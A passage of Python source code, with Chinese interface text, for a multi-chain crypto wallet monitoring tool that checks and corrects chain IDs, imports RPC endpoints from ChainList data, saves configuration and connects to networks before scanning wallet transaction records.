                    'message': '无可用RPC'
                }
            
            # 尝试从前3个RPC获取实际chain ID
            actual_chain_id = None
            working_rpc = None
            
            for rpc_url in rpc_urls[:3]:
                try:
                    actual_chain_id = self._get_actual_chain_id(rpc_url, timeout=3)
                    if actual_chain_id is not None:
                        working_rpc = rpc_url
                        break
                except Exception:
                    continue
            
            if actual_chain_id is None:
                return {
                    'network_key': network_key,
                    'network_name': network_name,
                    'status': 'connection_failed',
                    'configured_id': configured_chain_id,
                    'actual_id': None,
                    'message': '所有RPC连接失败'
                }
            elif actual_chain_id == configured_chain_id:
                return {
                    'network_key': network_key,
                    'network_name': network_name,
                    'status': 'correct',
                    'configured_id': configured_chain_id,
                    'actual_id': actual_chain_id,
                    'message': 'Chain ID正确'
                }
            else:
                return {
                    'network_key': network_key,
                    'network_name': network_name,
                    'status': 'mismatch',
                    'configured_id': configured_chain_id,
                    'actual_id': actual_chain_id,
                    'working_rpc': working_rpc,
                    'message': f'ID不匹配：配置 {configured_chain_id} ≠ 实际 {actual_chain_id}'
                }
        
        # 使用线程池并发检测
        completed_count = 0
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # 提交所有任务
            future_to_task = {executor.submit(detect_network_chain_id, task): task for task in detection_tasks}
            
            # 处理完成的任务
            for future in as_completed(future_to_task):
                completed_count += 1
                print(f"\r{Fore.YELLOW}🚀 检查进度: {completed_count}/{total_networks} ({completed_count*100//total_networks}%)...{Style.RESET_ALL}", end='', flush=True)
                
                try:
                    result = future.result()
                    calibration_results.append(result)
                except Exception as e:
                    # 处理异常情况
                    task = future_to_task[future]
                    calibration_results.append({
                        'network_key': task['network_key'],
                        'network_name': task['network_name'],
                        'status': 'error',
                        'configured_id': task['configured_chain_id'],
                        'actual_id': None,
                        'message': f'检测出错: {str(e)}'
                    })
        
        print(f"\n\n{Back.GREEN}{Fore.BLACK} 📊 检查完成 📊 {Style.RESET_ALL}")
        
        # 分类显示结果
        correct_networks = [r for r in calibration_results if r['status'] == 'correct']
        mismatch_networks = [r for r in calibration_results if r['status'] == 'mismatch']
        failed_networks = [r for r in calibration_results if r['status'] in ['connection_failed', 'no_rpc']]
        
        print(f"✅ Chain ID正确: {Fore.GREEN}{len(correct_networks)}{Style.RESET_ALL} 个")
        print(f"⚠️  Chain ID不匹配: {Fore.YELLOW}{len(mismatch_networks)}{Style.RESET_ALL} 个")
        print(f"❌ 无法检测: {Fore.RED}{len(failed_networks)}{Style.RESET_ALL} 个")
        
        # 显示不匹配的详情
        if mismatch_networks:
            print(f"\n{Back.YELLOW}{Fore.BLACK} ⚠️ Chain ID不匹配的网络 ⚠️ {Style.RESET_ALL}")
            for result in mismatch_networks:
                print(f"  • {Fore.CYAN}{result['network_name']}{Style.RESET_ALL}: "
                      f"配置 {Fore.RED}{result['configured_id']}{Style.RESET_ALL} → "
                      f"实际 {Fore.GREEN}{result['actual_id']}{Style.RESET_ALL}")
            
            # 询问是否自动校准
            print(f"\n{Fore.YELLOW}🔧 是否自动校准这些网络的Chain ID？{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}⚠️ 警告：这将修改网络配置，建议先备份{Style.RESET_ALL}")
            
            confirm = self.safe_input(f"\n{Fore.CYAN}➜ 确认自动校准？(y/N): {Style.RESET_ALL}").strip().lower()
            
            if confirm == 'y':
                # 执行自动校准
                for result in mismatch_networks:
                    network_key = result['network_key']
                    old_id = result['configured_id']
                    new_id = result['actual_id']
                    
                    # 更新网络配置
                    self.networks[network_key]['chain_id'] = new_id
                    
                    print(f"  🔧 {Fore.GREEN}已校准{Style.RESET_ALL}: {result['network_name']} "
                          f"ID {old_id} → {new_id}")
                    calibrated_count += 1
                
                print(f"\n{Fore.GREEN}✅ 已校准 {calibrated_count} 个网络的Chain ID{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 建议重新初始化网络连接以应用更改{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}⚠️ 校准操作已取消{Style.RESET_ALL}")
        
        # 显示失败的网络
        if failed_networks:
            print(f"\n{Back.RED}{Fore.WHITE} ❌ 无法检测的网络 ❌ {Style.RESET_ALL}")
            for result in failed_networks:
                print(f"  • {Fore.CYAN}{result['network_name']}{Style.RESET_ALL}: {result['message']}")
        
        return calibration_results

    def ai_smart_calibrate_from_chainlist(self):
        """AI智能从ChainList全自动校准所有链条"""
        print(f"\n{Back.MAGENTA}{Fore.WHITE} 🤖 AI智能全自动校准系统 🤖 {Style.RESET_ALL}")
        print(f"{Fore.CYAN}正在启动AI智能校准系统，自动从ChainList匹配和校准所有链条...{Style.RESET_ALL}")
        
        # 读取ChainList数据
        chainlist_data = self._read_chainlist_file()
        if not chainlist_data:
            print(f"{Fore.RED}❌ 无法读取ChainList数据，请确保chainlist.txt文件存在{Style.RESET_ALL}")
            return
        
        print(f"📊 ChainList数据: {Fore.CYAN}{len(chainlist_data)}{Style.RESET_ALL} 个链条")
        print(f"🏠 本地网络: {Fore.CYAN}{len(self.networks)}{Style.RESET_ALL} 个链条")
        
        # 执行AI全自动校准
        try:
            results = self._ai_auto_calibrate_all_chains(chainlist_data, max_workers=8)
            
            # 显示最终统计
            print(f"\n{Back.GREEN}{Fore.BLACK} 📊 AI校准完成统计 📊 {Style.RESET_ALL}")
            
            updated_chains = results.get('updated', [])
            correct_chains = results.get('already_correct', [])
            no_match_chains = results.get('no_match', [])
            pending_chains = results.get('pending_updates', [])
            
            print(f"🎉 已更新: {Fore.GREEN}{len(updated_chains)}{Style.RESET_ALL} 个链条")
            print(f"✅ 已正确: {Fore.CYAN}{len(correct_chains)}{Style.RESET_ALL} 个链条")
            print(f"⏸️  待更新: {Fore.YELLOW}{len(pending_chains)}{Style.RESET_ALL} 个链条")
            print(f"❓ 无匹配: {Fore.RED}{len(no_match_chains)}{Style.RESET_ALL} 个链条")
            
            # 显示无匹配的链条（可能需要手动处理）
            if no_match_chains:
                print(f"\n{Back.YELLOW}{Fore.BLACK} ⚠️ 以下链条在ChainList中未找到匹配 ⚠️ {Style.RESET_ALL}")
                for chain in no_match_chains[:5]:  # 只显示前5个
                    print(f"  • {chain['local_name']} (Chain ID: {chain['local_chain_id']})")
                if len(no_match_chains) > 5:
                    print(f"  ... 还有 {len(no_match_chains) - 5} 个")
            
            if updated_chains:
                print(f"\n{Fore.GREEN}💡 建议：重新启动程序或初始化网络连接以应用Chain ID更改{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"\n{Fore.RED}❌ AI校准过程中出错: {e}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键继续...{Style.RESET_ALL}")

    def ai_smart_chainlist_import(self):
        """AI智能ChainList导入系统 - 集成匹配、校准和RPC导入"""
        print(f"\n{Back.MAGENTA}{Fore.WHITE} 🤖 AI智能ChainList导入系统 🤖 {Style.RESET_ALL}")
        print(f"{Fore.CYAN}集成功能：AI智能匹配 + 自动校准Chain ID + 批量导入RPC{Style.RESET_ALL}")
        
        # 询问用户选择文件查找方式
        print(f"\n{Fore.YELLOW}📂 文件选择方式：{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}1.{Style.RESET_ALL} 🤖 智能自动查找（推荐）")
        print(f"  {Fore.GREEN}2.{Style.RESET_ALL} 📝 手动指定文件名")
        print(f"  {Fore.GREEN}3.{Style.RESET_ALL} 📋 从候选文件中选择")
        print(f"  {Fore.GREEN}4.{Style.RESET_ALL} 🌐 直接网络下载")
        
        choice = self.safe_input(f"\n{Fore.CYAN}➜ 请选择 (1-4，默认1): {Style.RESET_ALL}").strip()
        
        chainlist_data = None
        
        if choice == '2':
            # 手动指定文件名
            filename = self.safe_input(f"{Fore.CYAN}➜ 请输入文件名或完整路径: {Style.RESET_ALL}").strip()
            if filename:
                chainlist_data = self._read_chainlist_file(filename)
        
        elif choice == '3':
            # 交互式选择候选文件
            chainlist_data = self._interactive_file_selection()
            
        elif choice == '4':
            # 直接网络下载
            print(f"\n{Fore.CYAN}🌐 正在从网络下载ChainList数据...{Style.RESET_ALL}")
            file_path = self._download_chainlist_fallback()
            if file_path:
                chainlist_data = self._read_chainlist_file(os.path.basename(file_path))
        
        # 如果用户没有选择或指定文件失败，使用智能查找
        if not chainlist_data:
            print(f"\n{Fore.CYAN}🤖 使用增强版智能自动查找...{Style.RESET_ALL}")
            chainlist_data = self._read_chainlist_file()
            
        if not chainlist_data:
            print(f"{Fore.RED}❌ 无法读取ChainList数据{Style.RESET_ALL}")
            return
        
        print(f"📊 ChainList数据: {Fore.CYAN}{len(chainlist_data)}{Style.RESET_ALL} 个链条")
        print(f"🏠 本地网络: {Fore.CYAN}{len(self.networks)}{Style.RESET_ALL} 个链条")
        
        try:
            # 第一步：AI智能匹配和校准
            print(f"\n{Back.BLUE}{Fore.WHITE} 第一步：AI智能匹配和校准 {Style.RESET_ALL}")
            calibration_results = self._ai_auto_calibrate_all_chains(chainlist_data, max_workers=8)
            
            # 第二步：处理校准后的数据，准备RPC导入
            print(f"\n{Back.BLUE}{Fore.WHITE} 第二步：准备RPC数据导入 {Style.RESET_ALL}")
            
            # 收集需要导入RPC的链条
            matched_networks = {}
            unmatched_chains = []
            
            updated_chains = calibration_results.get('updated', [])
            correct_chains = calibration_results.get('already_correct', [])
            no_match_chains = calibration_results.get('no_match', [])
            
            # 处理已匹配的链条（包括更新的和已正确的）
            all_matched_chains = updated_chains + correct_chains
            
            for chain_info in all_matched_chains:
                if 'chain_data' in chain_info:
                    chain_data = chain_info['chain_data']
                else:
                    # 需要从chainlist_data中找到对应的数据
                    network_key = chain_info['network_key']
                    network_info = self.networks[network_key]
                    chain_id = network_info['chain_id']
                    
                    # 在chainlist_data中查找匹配的链条
                    chain_data = None
                    for cl_data in chainlist_data:
                        if cl_data.get('chainId') == chain_id:
                            chain_data = cl_data
                            break
                    
                    if not chain_data:
                        continue
                
                # 提取RPC URLs
                rpc_list = chain_data.get('rpc', [])
                if rpc_list:
                    network_key = chain_info['network_key']
                    rpc_urls = []
                    
                    for rpc_entry in rpc_list:
                        if isinstance(rpc_entry, str):
                            rpc_urls.append(rpc_entry)
                        elif isinstance(rpc_entry, dict):
                            url = rpc_entry.get('url')
                            if url:
                                rpc_urls.append(url)
                    
                    if rpc_urls:
                        matched_networks[network_key] = rpc_urls
            
            # 处理无匹配的链条
            for chain_info in no_match_chains:
                unmatched_chains.append({
                    'name': chain_info['local_name'],
                    'chain_id': chain_info['local_chain_id'],
                    'network_key': chain_info['network_key']
                })
            
            print(f"🎯 找到匹配的网络: {Fore.GREEN}{len(matched_networks)}{Style.RESET_ALL} 个")
            print(f"❓ 无匹配的网络: {Fore.RED}{len(unmatched_chains)}{Style.RESET_ALL} 个")
            
            # 第三步：批量导入RPC
            if matched_networks:
                print(f"\n{Back.BLUE}{Fore.WHITE} 第三步：批量导入RPC {Style.RESET_ALL}")
                self._batch_import_rpcs(matched_networks)
            
            # 第四步：处理无匹配的链条
            if unmatched_chains:
                print(f"\n{Back.YELLOW}{Fore.BLACK} ⚠️ 以下链条无法在ChainList中找到匹配 ⚠️ {Style.RESET_ALL}")
                print(f"{Fore.CYAN}💡 建议：可以手动补充这些链条的信息{Style.RESET_ALL}")
                
                for i, chain in enumerate(unmatched_chains[:10], 1):  # 只显示前10个
                    print(f"  {i}. {chain['name']} (Chain ID: {chain['chain_id']})")
                
                if len(unmatched_chains) > 10:
                    print(f"     ... 还有 {len(unmatched_chains) - 10} 个链条")
                
                # 询问是否手动补充
                print(f"\n{Fore.YELLOW}🤔 是否需要手动补充这些链条的信息？{Style.RESET_ALL}")
                manual_add = self.safe_input(f"{Fore.CYAN}➜ 输入 'y' 进入手动补充模式，或按回车跳过: {Style.RESET_ALL}").strip().lower()
                
                if manual_add == 'y':
                    self._manual_supplement_chains(unmatched_chains)
            
            # 保存所有更改到持久化存储
            print(f"\n{Back.BLUE}{Fore.WHITE} 💾 保存配置和数据 💾 {Style.RESET_ALL}")
            try:
                # 保存网络配置
                self.save_state()
                print(f"  ✅ 网络配置已保存")
                
                # 保存钱包数据
                self.save_wallets()
                print(f"  ✅ 钱包数据已保存")
                
                # 清除相关缓存，确保下次读取最新数据
                if hasattr(self, 'cache') and self.cache:
                    self.cache.clear_category('network_info')
                    self.cache.clear_category('rpc_status')
                    print(f"  ✅ 缓存已清理")
                
            except Exception as save_error:
                print(f"  {Fore.RED}❌ 保存数据时出错: {save_error}{Style.RESET_ALL}")
            
            # 显示最终统计
            print(f"\n{Back.GREEN}{Fore.BLACK} 🎉 AI智能导入完成 🎉 {Style.RESET_ALL}")
            
            total_updated = len(calibration_results.get('updated', []))
            total_imported = len(matched_networks)
            total_unmatched = len(unmatched_chains)
            
            print(f"🔧 校准链条: {Fore.GREEN}{total_updated}{Style.RESET_ALL} 个")
            print(f"📥 导入网络: {Fore.CYAN}{total_imported}{Style.RESET_ALL} 个")
            print(f"❓ 无匹配链条: {Fore.RED}{total_unmatched}{Style.RESET_ALL} 个")
            
            # 提示数据同步完成
            if total_updated > 0 or total_imported > 0:
                print(f"\n{Fore.GREEN}✅ 数据已同步保存，现在可以使用'初始化服务器连接'功能{Style.RESET_ALL}")
                print(f"{Fore.CYAN}💡 建议：现在执行菜单选项 1 来初始化服务器连接{Style.RESET_ALL}")
                
                # 显示详细的同步报告
                self._show_sync_report(calibration_results, matched_networks)
                
                # 询问是否直接执行初始化服务器连接
                auto_init = self.safe_input(f"\n{Fore.YELLOW}🚀 是否立即执行'初始化服务器连接'？(Y/n): {Style.RESET_ALL}").strip().lower()
                if auto_init in ['', 'y', 'yes']:
                    print(f"\n{Fore.CYAN}🚀 正在启动服务器连接初始化...{Style.RESET_ALL}")
                    self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键开始初始化...{Style.RESET_ALL}")
                    self.initialize_server_connections()
                    return  # 直接返回，不需要再次按回车
                
        except Exception as e:
            print(f"\n{Fore.RED}❌ AI智能导入过程中出错: {e}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键继续...{Style.RESET_ALL}")

    def _manual_supplement_chains(self, unmatched_chains: List[dict]):
        """手动补充无匹配链条的信息"""
        print(f"\n{Back.CYAN}{Fore.WHITE} 🔧 手动补充链条信息 🔧 {Style.RESET_ALL}")
        print(f"{Fore.YELLOW}你可以为以下链条手动添加RPC节点或更新Chain ID{Style.RESET_ALL}")
        
        for i, chain in enumerate(unmatched_chains, 1):
            print(f"\n--- 链条 {i}: {chain['name']} ---")
            print(f"当前Chain ID: {chain['chain_id']}")
            
            # 询问是否要添加RPC
            add_rpc = self.safe_input(f"是否为此链条添加RPC节点？(y/N): ").strip().lower()
            
            if add_rpc == 'y':
                while True:
                    rpc_url = self.safe_input(f"请输入RPC URL (或按回车完成): ").strip()
                    if not rpc_url:
                        break
                    
                    # 测试RPC
                    print(f"正在测试RPC: {rpc_url}")
                    if self.add_custom_rpc(chain['network_key'], rpc_url):
                        print(f"{Fore.GREEN}✅ RPC添加成功{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}❌ RPC测试失败{Style.RESET_ALL}")
            
            # 询问是否要更新Chain ID
            update_id = self.safe_input(f"是否更新Chain ID？当前: {chain['chain_id']} (y/N): ").strip().lower()
            
            if update_id == 'y':
                try:
                    new_id = int(self.safe_input(f"请输入新的Chain ID: ").strip())
                    self.networks[chain['network_key']]['chain_id'] = new_id
                    print(f"{Fore.GREEN}✅ Chain ID已更新: {chain['chain_id']} → {new_id}{Style.RESET_ALL}")
                except ValueError:
                    print(f"{Fore.RED}❌ 无效的Chain ID{Style.RESET_ALL}")
            
            # 询问是否继续
            if i < len(unmatched_chains):
                continue_add = self.safe_input(f"继续处理下一个链条？(Y/n): ").strip().lower()
                if continue_add == 'n':
                    break
        
        # 手动补充完成后保存数据
        print(f"\n{Back.BLUE}{Fore.WHITE} 💾 保存手动补充的数据 💾 {Style.RESET_ALL}")
        try:
            self.save_state()
            self.save_wallets()
            print(f"  ✅ 所有更改已保存")
        except Exception as e:
            print(f"  {Fore.RED}❌ 保存失败: {e}{Style.RESET_ALL}")
    
    def _show_sync_report(self, calibration_results: dict, matched_networks: dict):
        """显示详细的数据同步报告"""
        print(f"\n{Back.CYAN}{Fore.WHITE} 📋 数据同步详细报告 📋 {Style.RESET_ALL}")
        
        # 校准更新详情
        updated_chains = calibration_results.get('updated', [])
        if updated_chains:
            print(f"\n{Fore.YELLOW}🔧 Chain ID 校准详情：{Style.RESET_ALL}")
            for i, chain in enumerate(updated_chains[:5], 1):  # 显示前5个
                old_id = chain.get('old_chain_id', 'N/A')
                new_id = chain.get('new_chain_id', 'N/A')
                name = chain.get('local_name', 'Unknown')
                print(f"  {i}. {name}: {Fore.RED}{old_id}{Style.RESET_ALL} → {Fore.GREEN}{new_id}{Style.RESET_ALL}")
            
            if len(updated_chains) > 5:
                print(f"     ... 还有 {len(updated_chains) - 5} 个链条已校准")
        
        # RPC导入详情
        if matched_networks:
            print(f"\n{Fore.CYAN}📥 RPC 导入详情：{Style.RESET_ALL}")
            for i, (network_key, rpc_urls) in enumerate(list(matched_networks.items())[:5], 1):  # 显示前5个
                network_name = self.networks.get(network_key, {}).get('name', network_key)
                rpc_count = len(rpc_urls)
                print(f"  {i}. {network_name}: {Fore.GREEN}{rpc_count}{Style.RESET_ALL} 个RPC节点")
            
            if len(matched_networks) > 5:
                print(f"     ... 还有 {len(matched_networks) - 5} 个网络已导入RPC")
        
        # 数据同步状态
        print(f"\n{Fore.GREEN}🔄 数据同步状态：{Style.RESET_ALL}")
        print(f"  ✅ 网络配置文件已更新")
        print(f"  ✅ 钱包数据已同步")
        print(f"  ✅ 缓存已清理")
        print(f"  ✅ 所有更改已持久化保存")
        
        # 下一步建议
        print(f"\n{Fore.CYAN}💡 建议的下一步操作：{Style.RESET_ALL}")
        print(f"  1. 立即执行'初始化服务器连接'验证RPC节点")
        print(f"  2. 检查连接状态，确保所有网络可正常使用")
        print(f"  3. 开始监控和扫描操作")

    def initialize_server_connections(self):
        """初始化服务器连接 - 检测所有网络并建立最佳连接"""
        print(f"\n{Back.GREEN}{Fore.BLACK} 🚀 初始化服务器连接 🚀 {Style.RESET_ALL}")
        print(f"{Fore.CYAN}正在检测所有网络的RPC节点并建立最佳连接...{Style.RESET_ALL}")
        
        # 重新加载网络配置，确保获取最新的数据
        print(f"\n{Back.BLUE}{Fore.WHITE} 🔄 同步最新网络配置 🔄 {Style.RESET_ALL}")
        try:
            # 清除缓存，确保读取最新数据
            if hasattr(self, 'cache') and self.cache:
                self.cache.clear_category('network_info')
                self.cache.clear_category('rpc_status')
                print(f"  ✅ 缓存已清理")
            
            # 重新加载网络配置
            if hasattr(self, 'load_state'):
                # 重新加载状态文件
                self.load_state()
                print(f"  ✅ 网络配置已重新加载")
            
            print(f"  📊 当前网络数量: {Fore.CYAN}{len(self.networks)}{Style.RESET_ALL} 个")
            
        except Exception as e:
            print(f"  {Fore.YELLOW}⚠️ 重载配置时出现问题: {e}{Style.RESET_ALL}")
            print(f"  {Fore.CYAN}继续使用当前配置...{Style.RESET_ALL}")
        
        start_time = time.time()
        
        # 步骤1: 并发检测所有网络的RPC状态
        print(f"\n{Back.BLUE}{Fore.WHITE} 📡 第一步：并发检测所有网络RPC状态 📡 {Style.RESET_ALL}")
        
        successful_connections = 0
        failed_connections = 0
        total_networks = len(self.networks)
        
        # 使用并发检测提高速度
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_network = {
                executor.submit(self.test_network_concurrent, network_key): network_key 
                for network_key in self.networks.keys()
            }
            
            completed_count = 0
            try:
                for future in as_completed(future_to_network, timeout=120):
                    network_key = future_to_network[future]
                    completed_count += 1
                    network_info = self.networks[network_key]
                    
                    try:
                        result = future.result(timeout=30)
                        if result and result['working_rpcs']:
                            # 建立连接到最快的RPC
                            fastest_rpc = result['fastest_rpc']
                            if self.establish_single_connection(network_key, fastest_rpc['url']):
                                successful_connections += 1
                                status_color = Fore.GREEN
                                status_icon = "✅"
                                status_text = f"已连接 ({fastest_rpc['response_time']:.2f}s)"
                            else:
                                failed_connections += 1
                                status_color = Fore.RED
                                status_icon = "❌"
                                status_text = "连接失败"
                        else:
                            failed_connections += 1
                            status_color = Fore.RED
                            status_icon = "❌"
                            status_text = "无可用RPC"
                        
                        # 实时显示每个网络的连接状态（包含Chain ID）
                        progress = f"[{completed_count:2d}/{total_networks}]"
                        chain_id = network_info.get('chain_id', 'N/A')
                        network_display = f"{network_info['name']:<30} (ID:{chain_id})"
                        print(f"  {Fore.CYAN}{progress}{Style.RESET_ALL} {status_color}{status_icon} {network_display:<40}{Style.RESET_ALL} {status_color}{status_text}{Style.RESET_ALL}")
                        
                    except (concurrent.futures.TimeoutError, Exception) as e:
                        failed_connections += 1
                        progress = f"[{completed_count:2d}/{total_networks}]"
                        chain_id = network_info.get('chain_id', 'N/A')
                        network_display = f"{network_info['name']:<30} (ID:{chain_id})"
                        print(f"  {Fore.CYAN}{progress}{Style.RESET_ALL} {Fore.RED}❌ {network_display:<40}{Style.RESET_ALL} {Fore.RED}异常: {str(e)[:30]}{Style.RESET_ALL}")
            except concurrent.futures.TimeoutError:
                # 处理未完成的futures
                for future, network_key in future_to_network.items():
                    if not future.done():
                        future.cancel()
                        failed_connections += 1
                        network_info = self.networks[network_key]
                        chain_id = network_info.get('chain_id', 'N/A')
                        network_display = f"{network_info['name']:<30} (ID:{chain_id})"
                        print(f"  {Fore.CYAN}[--/--]{Style.RESET_ALL} {Fore.YELLOW}⚠️ {network_display:<40}{Style.RESET_ALL} {Fore.YELLOW}测试超时，已取消{Style.RESET_ALL}")
        
        # 步骤2: 显示连接总结
        elapsed_time = time.time() - start_time
        print(f"\n{Back.GREEN}{Fore.BLACK} 📊 连接初始化完成 📊 {Style.RESET_ALL}")
        print(f"⏱️  用时: {Fore.CYAN}{elapsed_time:.2f}s{Style.RESET_ALL}")
        print(f"✅ 成功连接: {Fore.GREEN}{successful_connections}{Style.RESET_ALL} 个网络")
        print(f"❌ 连接失败: {Fore.RED}{failed_connections}{Style.RESET_ALL} 个网络")
        print(f"📊 成功率: {Fore.YELLOW}{successful_connections/total_networks*100:.1f}%{Style.RESET_ALL}")
        
        # 收集失败的网络，提供手动修改Chain ID的功能
        failed_networks = []
        
        # 检查连接状态，收集失败的网络
        for network_key, network_info in self.networks.items():
            # 检查该网络是否有有效连接
            if not hasattr(self, 'connections') or not self.connections.get(network_key):
                failed_networks.append({
                    'key': network_key,
                    'name': network_info['name'],
                    'chain_id': network_info.get('chain_id', 'N/A')
                })
        
        # 如果有失败的网络，询问是否要手动修改Chain ID
        if failed_networks:
            print(f"\n{Back.YELLOW}{Fore.BLACK} ⚠️ 连接失败的网络 ⚠️ {Style.RESET_ALL}")
            print(f"{Fore.CYAN}可能的原因：Chain ID不正确、RPC节点问题等{Style.RESET_ALL}")
            
            modify_chains = self.safe_input(f"\n{Fore.YELLOW}🔧 是否要手动修改失败网络的Chain ID？(y/N): {Style.RESET_ALL}").strip().lower()
            
            if modify_chains == 'y':
                self._manual_chain_id_modification(failed_networks)
        
        # 步骤3: 自动开始扫描（优化版本）
        if successful_connections > 0:
            print(f"\n{Fore.GREEN}📡 网络连接就绪！{Style.RESET_ALL}")
            
            if self.wallets:
                print(f"{Back.CYAN}{Fore.WHITE} 🔍 开始智能扫描链上交易记录 (20线程) 🔍 {Style.RESET_ALL}")
                scan_result = self.scan_addresses_with_detailed_display()
                if scan_result:
                    print(f"\n{Fore.GREEN}✅ 链上交易记录扫描完成{Style.RESET_ALL}")
                    return
            else:
                print(f"\n{Fore.YELLOW}💡 请先添加钱包地址，然后可以开始扫描{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}❌ 所有网络连接都失败了，请检查网络设置或RPC配置{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💡 建议使用菜单选项 4 → 2 管理无可用RPC的链条{Style.RESET_ALL}")
    
    def _manual_chain_id_modification(self, failed_networks: list):
        """手动修改失败网络的Chain ID"""
        print(f"\n{Back.CYAN}{Fore.WHITE} 🔧 手动修改Chain ID 🔧 {Style.RESET_ALL}")
        print(f"{Fore.CYAN}以下网络连接失败，可能需要修改Chain ID：{Style.RESET_ALL}")
        
        # 显示失败的网络列表
        for i, network in enumerate(failed_networks[:10], 1):  # 最多显示10个
            print(f"  {Fore.YELLOW}{i}.{Style.RESET_ALL} {network['name']:<30} (当前ID: {Fore.RED}{network['chain_id']}{Style.RESET_ALL})")
        
        if len(failed_networks) > 10:
            print(f"     ... 还有 {len(failed_networks) - 10} 个网络")
        
        print(f"\n{Fore.CYAN}💡 常见Chain ID参考：{Style.RESET_ALL}")
        common_chain_ids = {
            'Ethereum': 1,
            'BSC': 56,
            'Polygon': 137,
            'Avalanche': 43114,
            'Fantom': 250,
            'Arbitrum One': 42161,
            'Optimism': 10,
            'Core': 1116,
            'Harmony': 1666600000,
            'Klaytn': 8217
        }
        
        for name, chain_id in list(common_chain_ids.items())[:5]:
            print(f"  • {name}: {chain_id}")
        print(f"  • 更多信息: https://chainlist.org")
        
        print(f"\n{Fore.YELLOW}🚀 快速操作说明：{Style.RESET_ALL}")
        print(f"  • 输入序号选择网络 (如: 1,3,5 或 1-5)")
        print(f"  • 输入 'all' 跳过所有网络")
        print(f"  • 输入 'q' 退出修改")
        
        # 优化的手动修改流程
        modified_count = 0
        while True:
            choice = self.safe_input(f"\n{Fore.CYAN}➜ 请选择要修改的网络: {Style.RESET_ALL}").strip().lower()
            
            if choice == 'q':
                break
            elif choice == 'all':
                print(f"{Fore.YELLOW}📋 跳过所有Chain ID修改，继续下一步...{Style.RESET_ALL}")
                break
            elif choice == '':
                continue
            
            try:
                # 解析序号选择
                selected_indices = []
                
                if ',' in choice:
                    # 逗号分隔: 1,3,5
                    parts = choice.split(',')
                    for part in parts:
                        if '-' in part.strip():
                            # 范围: 1-3
                            start, end = map(int, part.strip().split('-'))
                            selected_indices.extend(range(start, end + 1))
                        else:
                            selected_indices.append(int(part.strip()))
                elif '-' in choice:
                    # 范围: 1-5
                    start, end = map(int, choice.split('-'))
                    selected_indices.extend(range(start, end + 1))
                else:
                    # 单个序号: 3
                    selected_indices.append(int(choice))
                
                # 过滤有效序号
                valid_indices = [i for i in selected_indices if 1 <= i <= len(failed_networks)]
                
                if not valid_indices:
                    print(f"{Fore.RED}❌ 无效的序号选择{Style.RESET_ALL}")
                    continue
                
                # 批量修改选中的网络
                batch_modified = 0
                for index in valid_indices:
                    network = failed_networks[index - 1]
                    print(f"\n--- 正在修改网络 {index}: {network['name']} ---")
                    print(f"当前Chain ID: {Fore.RED}{network['chain_id']}{Style.RESET_ALL}")
                    
                    new_chain_id = self.safe_input(f"请输入新的Chain ID (回车跳过): ").strip()
                    if not new_chain_id:
                        print(f"{Fore.YELLOW}⏭️ 跳过此网络{Style.RESET_ALL}")
                        continue
                    
                    try:
                        new_id = int(new_chain_id)
                        if new_id <= 0:
                            print(f"{Fore.RED}❌ Chain ID必须为正整数{Style.RESET_ALL}")
                            continue
                        
                        # 更新Chain ID
                        old_id = self.networks[network['key']]['chain_id']
                        self.networks[network['key']]['chain_id'] = new_id
                        
                        print(f"{Fore.GREEN}✅ Chain ID已更新: {old_id} → {new_id}{Style.RESET_ALL}")
                        batch_modified += 1
                        modified_count += 1
                    except ValueError:
                        print(f"{Fore.RED}❌ 请输入有效的数字{Style.RESET_ALL}")
                
                if batch_modified > 0:
                    print(f"\n{Fore.GREEN}🎉 已成功修改 {batch_modified} 个网络的Chain ID{Style.RESET_ALL}")
                    
                    # 询问是否继续修改其他网络
                    continue_modify = self.safe_input(f"{Fore.YELLOW}是否继续修改其他网络？(y/N): {Style.RESET_ALL}").strip().lower()
                    if continue_modify != 'y':
                        break
                else:
                    print(f"{Fore.YELLOW}📋 未修改任何网络{Style.RESET_ALL}")
                    break
                    
            except ValueError:
                print(f"{Fore.RED}❌ 输入格式错误，请使用正确的序号格式{Style.RESET_ALL}")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}⚠️ 操作已取消{Style.RESET_ALL}")
                return
        
        # 保存修改
        if modified_count > 0:
            print(f"\n{Back.BLUE}{Fore.WHITE} 💾 保存修改 💾 {Style.RESET_ALL}")
            try:
                self.save_state()
                self.save_wallets()
                print(f"  ✅ 已保存 {modified_count} 个网络的Chain ID修改")
                
                # 清除缓存
                if hasattr(self, 'cache') and self.cache:
                    self.cache.clear_category('network_info')
                    self.cache.clear_category('rpc_status')
                    print(f"  ✅ 缓存已清理")
                
                print(f"\n{Fore.GREEN}💡 Chain ID修改已保存{Style.RESET_ALL}")
                
                # 验证修改是否正确保存
                self._verify_network_changes(modified_count)
                    
            except Exception as e:
                print(f"  {Fore.RED}❌ 保存失败: {e}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}💡 没有进行任何修改{Style.RESET_ALL}")
    
    def _verify_network_changes(self, expected_changes: int):
        """验证网络配置修改是否正确保存"""
        try:
            print(f"\n{Back.CYAN}{Fore.WHITE} 🔍 验证配置修改 🔍 {Style.RESET_ALL}")
            
            # 重新加载状态文件验证
            if os.path.exists(self.state_file):
                with open(self.state_file, 'r') as f:
                    saved_state = json.load(f)
                
                saved_networks = saved_state.get('networks', {})
                if saved_networks:
                    print(f"  ✅ 网络配置已写入状态文件 ({len(saved_networks)} 个网络)")
                    
                    # 检查最近修改时间
                    last_save = saved_state.get('last_save')
                    if last_save:
                        save_time = datetime.fromisoformat(last_save)
                        time_diff = (datetime.now() - save_time).total_seconds()
                        print(f"  ✅ 最后保存时间: {save_time.strftime('%H:%M:%S')} ({time_diff:.1f}秒前)")
                    
                    # 验证当前内存中的networks与保存的一致
                    memory_match = True
